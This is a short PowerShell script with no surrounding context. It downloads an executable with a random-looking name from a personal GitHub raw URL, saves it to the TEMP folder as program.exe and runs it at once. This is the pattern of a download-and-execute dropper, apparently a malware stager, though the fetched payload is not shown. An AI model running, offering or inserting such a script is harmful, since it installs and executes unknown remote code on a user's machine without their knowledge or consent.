$url = "https://raw.githubusercontent.com/fasa3e/fdd/refs/heads/main/wyedchp9m9oa9tkj.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
